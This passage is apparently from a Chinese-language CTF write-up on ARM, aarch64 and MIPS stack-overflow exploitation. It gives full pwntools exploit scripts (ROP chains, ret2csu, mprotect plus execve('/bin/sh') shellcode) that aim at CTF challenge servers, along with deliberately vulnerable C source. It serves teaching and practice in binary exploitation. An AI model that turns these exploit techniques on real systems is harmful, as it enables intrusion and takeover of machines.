<p>我们只需要控制第一个参数，因此可以选择 <code>pop {r0, r4, pc}</code> 这条 gadgets, 来构造如下的栈结构</p>
<pre><code>+-------------+
|             |
|  padding    |
+-------------+
|  padding    | &lt;- frame pointer
+-------------+ 
|gadgets_addr | &lt;- return address
+-------------+
|binsh_addr   |
+-------------+
|junk_data    |
+-------------+
|system_addr  |
+-------------+</code></pre><p>这时还需要 padding 的长度和 system 以及 /bin/sh 的地址， /bin/sh 的地址用 ROPgadget 就可以找到</p>
<pre class="line-numbers language-bash"><code class="language-bash">jarvisOJ_typo <span class="token punctuation">[</span>master●●<span class="token punctuation">]</span> ROPgadget --binary ./typo --string /bin/sh
Strings information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x0006cb70 <span class="token keyword">:</span> /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>padding 的长度可以使用 pwntools 的 <strong>cyclic</strong> 来很方便的找到</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 R0   0x0
 R1   0xfffef024 ◂— 0x61616161 ('aaaa')
 R2   0x7e
 R3   0x0
 R4   0x62616162 ('baab')
 R5   0x0
 R6   0x0
 R7   0x0
 R8   0x0
 R9   0xa5ec ◂— push   {r3, r4, r5, r6, r7, r8, sb, lr}
 R10  0xa68c ◂— push   {r3, r4, r5, lr}
 R11  0x62616163 ('caab')
 R12  0x0
 SP   0xfffef098 ◂— 0x62616165 ('eaab')
 PC   0x62616164 ('daab')
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
Invalid address 0x62616164










────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ sp  0xfffef098 ◂— 0x62616165 ('eaab')
01:0004│     0xfffef09c ◂— 0x62616166 ('faab')
02:0008│     0xfffef0a0 ◂— 0x62616167 ('gaab')
03:000c│     0xfffef0a4 ◂— 0x62616168 ('haab')
04:0010│     0xfffef0a8 ◂— 0x62616169 ('iaab')
05:0014│     0xfffef0ac ◂— 0x6261616a ('jaab')
06:0018│     0xfffef0b0 ◂— 0x6261616b ('kaab')
07:001c│     0xfffef0b4 ◂— 0x6261616c ('laab')
Program received signal SIGSEGV
pwndbg> cyclic -l 0x62616164
112<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>因此 padding 长度即为 112</p>
<blockquote>
<p>或者可以更暴力一点直接爆破栈溢出的长度</p>
</blockquote>
<p>至于 system 的地址，因为这个 binary 被去除了符号表，我们可以先用 <code>rizzo</code> 来恢复部分符号表（关于恢复符号表暂时可以先看参考链接，以后会逐渐介绍）。虽然 rizzo 在这个 binary 上恢复的效果不好，但很幸运，在识别出来的几个函数中刚好有 system</p>
<pre class="line-numbers language-C"><code class="language-C">char *__fastcall system(int a1)
{
  char *result; // r0

  if ( a1 )
    result = sub_10BA8(a1);
  else
    result = (char *)(sub_10BA8((int)"exit 0") == 0);
  return result;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>或者可以通过搜索 /bin/sh 字符串来寻找 system 函数</p>
</blockquote>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>所有的条件都有了，构造 system(“/bin/sh”) 即可</p>
<pre class="line-numbers language-python"><code class="language-python">jarvisOJ_typo <span class="token punctuation">[</span>master●●<span class="token punctuation">]</span> cat solve<span class="token punctuation">.</span>py 
<span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> pdb
<span class="token comment" spellcheck="true">#  context.log_level = "debug"</span>

<span class="token comment" spellcheck="true">#  for i in range(100, 150)[::-1]:</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"l"</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./typo"</span><span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"d"</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./typo"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn2.jarvisoj.com"</span><span class="token punctuation">,</span> <span class="token number">9888</span><span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span>

    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"quit\n"</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token triple-quoted-string string">'''
    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
    Strings information
    ============================================================
    0x0006c384 : /bin/sh
    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop|ret" | grep r0
    0x00020904 : pop {r0, r4, pc}
    '''</span>

    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> i <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x20904</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x6c384</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x110B4</span><span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#  pause()</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true">#  pdb.set_trace()</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"echo aaaa"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"aaaa"</span><span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2018-上海市大学生网络安全大赛-baby-arm"><a href="#2018-上海市大学生网络安全大赛-baby-arm" class="headerlink" title="2018 上海市大学生网络安全大赛 - baby_arm"></a>2018 上海市大学生网络安全大赛 - baby_arm</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>题目给了一个 <code>aarch64</code> 架构的文件，没有开 canary 保护</p>
<pre class="line-numbers language-bash"><code class="language-bash">Shanghai2018_baby_arm <span class="token punctuation">[</span>master<span class="token punctuation">]</span> check ./pwn
+ <span class="token function">file</span> ./pwn
./pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, <span class="token keyword">for</span> GNU/Linux 3.7.0, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>e988eaee79fd41139699d813eac0c375dbddba43, stripped
+ checksec ./pwn
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/m4x/pwn_repo/Shanghai2018_baby_arm/pwn'</span>
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看一下程序逻辑</p>
<pre class="line-numbers language-C"><code class="language-C">__int64 main_logic()
{
  Init();
  write(1LL, "Name:", 5LL);
  read(0LL, input, 512LL);
  sub_4007F0();
  return 0LL;
}

void sub_4007F0()
{
  __int64 v0; // [xsp+10h] [xbp+10h]

  read(0LL, &v0, 512LL);
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>程序的主干读取了 512 个字符到一个全局变量上，而在 <code>sub_4007F0()</code> 中，又读取了 512 个字节到栈上，需要注意的是这里直接从 <code>frame pointer + 0x10</code> 开始读取，因此即使开了 canary 保护也无所谓。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>理一下思路，可以直接 rop，但我们不知道远程的 libc 版本，同时也发现程序中有调用 <code>mprotect</code> 的代码段</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
.text:00000000004007CC                 MOV             X29, SP
.text:00000000004007D0                 MOV             W2, #0
.text:00000000004007D4                 MOV             X1, #0x1000
.text:00000000004007D8                 MOV             X0, #0x1000
.text:00000000004007DC                 MOVK            X0, #0x41,LSL#16
.text:00000000004007E0                 BL              .mprotect
.text:00000000004007E4                 NOP
.text:00000000004007E8                 LDP             X29, X30, [SP],#0x10
.text:00000000004007EC                 RET<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但这段代码把 <code>mprotect</code> 的权限位设成了 0，没有可执行权限，这就需要我们通过 rop 控制 <code>mprotect</code> 设置如 bss 段等的权限为可写可执行</p>
<p>因此可以有如下思路：</p>
<ol>
<li>第一次输入 name 时，在 bss 段写上 shellcode</li>
<li>通过 rop 调用 mprotect 改变 bss 的权限</li>
<li>返回到 bss 上的 shellcode</li>
</ol>
<p><code>mprotect</code> 需要控制三个参数，可以考虑使用 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu" target="_blank" rel="noopener">ret2csu</a> 这种方法，可以找到如下的 gadgets 来控制 <code>x0, x1, x2</code> 寄存器</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
.text:00000000004008B0                 MOV             X2, X22
.text:00000000004008B4                 MOV             X1, X23
.text:00000000004008B8                 MOV             W0, W24
.text:00000000004008BC                 ADD             X19, X19, #1
.text:00000000004008C0                 BLR             X3
.text:00000000004008C4                 CMP             X19, X20
.text:00000000004008C8                 B.NE            loc_4008AC
.text:00000000004008CC
.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j
.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]
.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
.text:00000000004008DC                 RET<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最终的 <a href="https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py" target="_blank" rel="noopener">exp</a> 如下：</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sys
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./pwn"</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>

<span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"l"</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/aarch64-linux-gnu"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">elif</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"d"</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/aarch64-linux-gnu"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"106.75.126.171"</span><span class="token punctuation">,</span> <span class="token number">33865</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">csu_rop</span><span class="token punctuation">(</span>call<span class="token punctuation">,</span> x0<span class="token punctuation">,</span> x1<span class="token punctuation">,</span> x2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token number">0x4008CC</span><span class="token punctuation">,</span> <span class="token string">'00000000'</span><span class="token punctuation">,</span> <span class="token number">0x4008ac</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> call<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span>x2<span class="token punctuation">,</span> x1<span class="token punctuation">,</span> x0<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token string">'22222222'</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
    padding <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string">'mov x0, x0'</span><span class="token punctuation">)</span>

    sc <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#  print disasm(padding * 0x10 + sc)</span>
    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Name:"</span><span class="token punctuation">,</span> padding <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> sc<span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#  io.send(cyclic(length = 500, n = 8))</span>
    <span class="token comment" spellcheck="true">#  rop = flat()</span>
    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token punctuation">,</span> csu_rop<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__gmon_start__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token number">0x400824</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>flat<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>

    raw_input<span class="token punctuation">(</span><span class="token string">"DEBUG: "</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Name:"</span><span class="token punctuation">,</span> padding <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> sc<span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token punctuation">,</span> csu_rop<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__gmon_start__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x411000</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token number">0x411068</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h3><p>同时需要注意的是，<code>checksec</code> 检测的结果是开了 nx 保护，但这样检测的结果不一定准确，因为程序的 nx 保护也可以通过 qemu 启动时的参数 <code>-nx</code> 来决定（比如这道题目就可以通过远程失败时的报错发现程序开了 nx 保护），老版的 qemu 可能没有这个参数。</p>
<pre class="line-numbers language-bash"><code class="language-bash">Desktop ./qemu-aarch64 --version
qemu-aarch64 version 2.7.0, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2003-2016 Fabrice Bellard and the QEMU Project developers
Desktop ./qemu-aarch64 -h<span class="token operator">|</span> <span class="token function">grep</span> nx
-nx           QEMU_NX           <span class="token function">enable</span> NX implementation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果有如下的报错，说明没有 aarch64 的汇编器</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> Could not <span class="token function">find</span> <span class="token string">'as'</span> installed <span class="token keyword">for</span> ContextType<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'aarch64'</span>, binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn'</span><span class="token punctuation">)</span>, bits <span class="token operator">=</span> 64, endian <span class="token operator">=</span> <span class="token string">'little'</span>, log_level <span class="token operator">=</span> 10<span class="token punctuation">)</span>
    Try installing binutils <span class="token keyword">for</span> this architecture:
    https://docs.pwntools.com/en/stable/install/binutils.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>可以参考官方文档的解决方案</p>
<pre class="line-numbers language-bash"><code class="language-bash">Shanghai2018_baby_arm <span class="token punctuation">[</span>master●<span class="token punctuation">]</span> apt search binutils<span class="token operator">|</span> <span class="token function">grep</span> aarch64
p   binutils-aarch64-linux-gnu                                         - GNU binary utilities, <span class="token keyword">for</span> aarch64-linux-gnu target
p   binutils-aarch64-linux-gnu:i386                                    - GNU binary utilities, <span class="token keyword">for</span> aarch64-linux-gnu target
p   binutils-aarch64-linux-gnu-dbg                                     - GNU binary utilities, <span class="token keyword">for</span> aarch64-linux-gnu target <span class="token punctuation">(</span>debug symbols<span class="token punctuation">)</span>
p   binutils-aarch64-linux-gnu-dbg:i386                                - GNU binary utilities, <span class="token keyword">for</span> aarch64-linux-gnu target <span class="token punctuation">(</span>debug symbols<span class="token punctuation">)</span>
Shanghai2018_baby_arm <span class="token punctuation">[</span>master●<span class="token punctuation">]</span> <span class="token function">sudo</span> apt <span class="token function">install</span> bintuils-aarch64-linux-gnu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>aarch64 的文件在装 libc 时是 <code>arm64</code>，在装 <code>binutils</code> 时是 <code>aarch64</code></p>
</blockquote>
<p><strong>MIPS</strong></p>
<hr>
<h1 id="mips-ROP"><a href="#mips-ROP" class="headerlink" title="mips - ROP"></a>mips - ROP</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>本章目前只打算介绍 mips 下的 rop，其他漏洞的利用以后会逐渐介绍</p>
<h2 id="栈结构如图："><a href="#栈结构如图：" class="headerlink" title="栈结构如图："></a>栈结构如图：</h2><p><img src="/images/loading.gif" data-original="../images/CTF/image001.gif" alt=""><br>有几个特殊的地方需要注意</p>
<ol>
<li>MIPS32架构中是没有EBP寄存器的，程序函数调用的时候是将当前栈指针向下移动 n 比特到该函数的 stack frame 存储组空间，函数返回的时候再加上偏移量恢复栈</li>
<li>传参过程中，前四个参数$a0-$a3，多余的会保存在调用函数的预留的栈顶空间内</li>
<li>MIPS调用函数时会把函数的返回地址直接存入$RA 寄存器<h2 id="简单环境适配"><a href="#简单环境适配" class="headerlink" title="简单环境适配"></a>简单环境适配</h2>我们目前以用户态的形式调试程序, 所以需要安装 且，qemu-user  等依赖<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> apt <span class="token function">install</span> qemu-user
$ <span class="token function">sudo</span> apt <span class="token function">install</span> libc6-mipsel-cross
$ <span class="token function">sudo</span> <span class="token function">mkdir</span> /etc/qemu-binfmt
$ <span class="token function">sudo</span> <span class="token function">ln</span> -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><h3 id="1-ropemporium-ret2text"><a href="#1-ropemporium-ret2text" class="headerlink" title="1 ropemporium ret2text"></a>1 ropemporium ret2text</h3>跟到 pwnme 函数里<br><img src="/images/loading.gif" data-original="../images/CTF/20201028010554.png" alt=""><br>我们可以看到函数一开始，将  ra 寄存器的值，放入 $sp+60 的位置里。即返回地址位于 $sp+60<br><img src="/images/loading.gif" data-original="../images/CTF/20201028011258.png" alt="image-20201028011257573"><br>在看该函数里的 read， a2 为读取的 size 大小，将被赋值为 0x38，buf 为位于 $sp + 0x18 的位置，明显的一个栈溢出漏洞，且能覆盖返回地址。<br>通过计算，可以计算出 padding 为 36</li>
</ol>
<pre><code>60 - 0x18 = 36 </code></pre><p>另外程序有一个 ret2win 函数<br><img src="/images/loading.gif" data-original="../images/CTF/20201028011736.png" alt=""><br>所以该题目只需覆盖返回地址为 ret2win 函数的地址即可。所以我们可以构造如下 payload：</p>
<pre class="line-numbers language-python"><code class="language-python">pay <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">36</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret2win_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>即能 get flag<br><img src="/images/loading.gif" data-original="../images/CTF/20201028012455.png" alt=""></p>
<h3 id="2-DVRF-stack-bof-02-c"><a href="#2-DVRF-stack-bof-02-c" class="headerlink" title="2 DVRF stack_bof_02.c"></a>2 DVRF stack_bof_02.c</h3><p>题目源码如下</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token comment" spellcheck="true">//Simple BoF by b1ack0wl for E1550</span>
<span class="token comment" spellcheck="true">//Shellcode is Required</span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"\0"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: stack_bof_01 &lt;argument>\r\n-By b1ack0wl\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> 


<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to the Second BoF exercise! You'll need Shellcode for this! ;)\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You entered %s \r\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
